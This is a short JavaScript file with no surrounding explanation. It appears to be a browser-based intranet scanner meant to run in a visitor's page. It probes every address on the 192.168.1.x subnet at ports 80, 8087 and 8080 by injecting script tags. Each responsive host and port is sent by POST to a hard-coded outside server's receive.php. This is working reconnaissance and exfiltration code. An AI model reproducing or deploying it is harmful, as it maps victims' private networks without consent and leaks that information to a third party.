function ipsend(ip, netport) {
	var ipdata = ip + ":" + netport;
	var url = "http://45.32.250.207/receive.php";
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xmlhttp.send("ip=<!--- start --->" + ipdata);
}

function ipCreate(ip){
	var ips = ip.replace(/(\d+\.\d+\.\d+)\.\d+/,'$1.');
	for(var i=1;i<=255;i++){
		ElementCreate(ips+i,"80",i);
		ElementCreate(ips+i,"8087",i);
		ElementCreate(ips+i,"8080",i);//添加要扫描的端口
	}
}


function ElementCreate(ip,xport,i){
	var url = "http://"+ip+":"+xport;
	var scriptElement = document.createElement("script");
	scriptElement.src=url;
	//scriptElement.setAttribute("onload","alert(\'"+ip+"："+xport+"\')");
	scriptElement.setAttribute("onload", "ipsend(\'" + ip + "\', \'" + xport + "\')");
	document.body.appendChild(scriptElement);
}
ipCreate("192.168.1.1");
